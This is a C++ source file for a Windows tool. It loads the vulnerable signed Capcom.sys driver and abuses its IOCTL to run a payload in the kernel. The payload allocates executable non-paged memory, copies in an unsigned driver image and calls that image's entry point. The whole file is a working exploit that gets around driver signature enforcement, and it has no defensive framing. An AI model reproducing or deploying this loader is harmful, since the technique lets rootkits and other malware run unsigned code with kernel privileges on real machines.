// CapcomLib.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "DriverLoader.h"
#include "PELoader.h"
#include "PEFile.h"
#include "KernelHelp.h"

DECLARE_UNICODE_STRING(strAllocPoolWithTag, L"ExAllocatePoolWithTag");

HMODULE PayloadImage;
SIZE_T PayloadSize;
DWORD PayloadEntryRVA;
void (__stdcall *PayloadEntry)(PVOID DriverObject, PVOID RegistryEntry);

PVOID NTAPI LoaderPayload(MmGetSystemRoutineFunc _MmGetSystemRoutineAddress)
{
	// Allocate executable unpaged memory for driver
	PVOID drvmap = K_GetRoutine(ExAllocatePoolWithTag)(NonPagedPoolExecute, PayloadSize, '\0kdD');
	if (drvmap)
	{
		// Nice intrinsic trick from https://github.com/Professor-plum/Reflective-Driver-Loader/blob/master/Hadouken/Hadouken.c
		__movsq((PDWORD64)drvmap, (PDWORD64)PayloadImage, (SIZE_T)(PayloadSize / sizeof(INT64)));

		PayloadEntry = MakePointer<decltype(PayloadEntry)>(drvmap, PayloadEntryRVA);
		PayloadEntry(NULL, NULL);
	}
	return nullptr;
} 

int main()
{
	auto image = make_unique<PEImage>(L"TestDriver.sys");
	PayloadImage = image->MapForKernel();
	PayloadSize = image->GetMappedSize();
	PayloadEntryRVA = image->GetEntryPointRVA();

	Util::DebugPrint("Mapped Capcom.sys to: %p\n", PayloadImage);
	Util::DebugPrint("EntryPointRVA: %p\n", PayloadEntry);

	DriverLoader loader;
	loader.LoadDriverFromFile(L".\\Capcom.sys");
	loader.LoadCapcomService();
	loader.ExecIoCtlWithTrampoline(LoaderPayload);
	
	getchar();
    return 0;
}

 